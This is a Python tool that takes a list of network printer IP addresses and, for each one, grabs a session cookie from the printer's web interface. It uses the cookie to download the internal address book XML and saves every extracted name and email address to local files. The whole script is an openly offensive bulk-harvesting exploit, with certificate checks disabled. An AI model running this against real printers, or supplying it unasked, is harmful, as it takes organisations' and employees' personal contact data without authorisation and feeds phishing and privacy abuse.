import requests
import xml.etree.ElementTree as ET
import argparse
import os

# Disable SSL warnings for unverified certificates
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def get_cookie(ip, use_https=False):
    """Retrieve session cookie from the printer's index page, retrying with HTTPS if HTTP fails."""
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{ip}/wcd/index.html"

    try:
        response = requests.get(url, timeout=5, verify=False)  # Skip SSL verification
        response.raise_for_status()  # Raise an error for HTTP errors (e.g., 404, 500)
        
        if 'Set-Cookie' in response.headers:
            cookie = response.headers['Set-Cookie'].split(';')[0]  # Extract only the "ID=X" part
            print(f"[+] Retrieved cookie from {protocol}://{ip}")
            return cookie
        else:
            print(f"[!] No cookie received from {protocol}://{ip}")
            return None

    except requests.exceptions.SSLError:
        if not use_https:
            print(f"[!] SSL error on {ip}, retrying with HTTPS...")
            return get_cookie(ip, use_https=True)
        else:
            print(f"[X] SSL error on HTTPS for {ip}, skipping...")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[X] Failed to reach {protocol}://{ip}: {e}")
        return None

def get_address_book(ip, cookie, use_https=False):
    """Request the address book XML using the retrieved cookie."""
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{ip}/wcd/abbr.xml"
    headers = {'Cookie': cookie}

    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        response.raise_for_status()

        print(f"[+] Retrieved address book from {protocol}://{ip}")
        return response.text

    except requests.exceptions.SSLError:
        if not use_https:
            print(f"[!] SSL error retrieving XML from {ip}, retrying with HTTPS...")
            return get_address_book(ip, cookie, use_https=True)
        else:
            print(f"[X] SSL error retrieving XML from {ip} over HTTPS, skipping...")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[X] Failed to retrieve XML from {protocol}://{ip}: {e}")
        return None

def parse_xml(xml_data, ip):
    """Extract Name and Email from XML response."""
    parsed_data = []
    
    try:
        root = ET.fromstring(xml_data)

        for addr in root.findall(".//AddressKind"):
            name = addr.find("Name").text if addr.find("Name") is not None else "Unknown"
            send_config = addr.find("SendConfiguration")
            if send_config is not None:
                to_email = send_config.find("To").text if send_config.find("To") is not None else "No Email"
                parsed_data.append((name, to_email))

        if not parsed_data:
            print(f"[!] No records found in XML response for {ip}. Showing first 200 chars of response for debugging:")
            print(xml_data[:200])

        return parsed_data

    except ET.ParseError as e:
        print(f"[!] Error parsing XML from {ip}: {e}")
        print(f"[*] Partial response: {xml_data[:200]}")
        return []

def process_ip(ip, output_file):
    """Handles the full process for a single IP."""
    cookie = get_cookie(ip)
    if not cookie:
        return
    
    xml_data = get_address_book(ip, cookie)
    if not xml_data:
        return
    
    address_list = parse_xml(xml_data, ip)
    
    if address_list:
        with open(output_file, "a") as f:
            for name, email in address_list:
                f.write(f"{name},{email}\n")
        print(f"[+] Extracted {len(address_list)} records from {ip} into {output_file}")

def main():
    parser = argparse.ArgumentParser(description="Extract internal address books from network printers.")
    parser.add_argument("-i", "--input", help="File containing list of printer IPs", required=True)

    args = parser.parse_args()
    
    if not os.path.exists(args.input):
        print(f"[!] Input file {args.input} not found.")
        return

    with open(args.input, "r") as file:
        ips = [line.strip() for line in file if line.strip()]
    
    for ip in ips:
        output_file = f"{ip}_addrbook.txt"
        process_ip(ip, output_file)

if __name__ == "__main__":
    main()
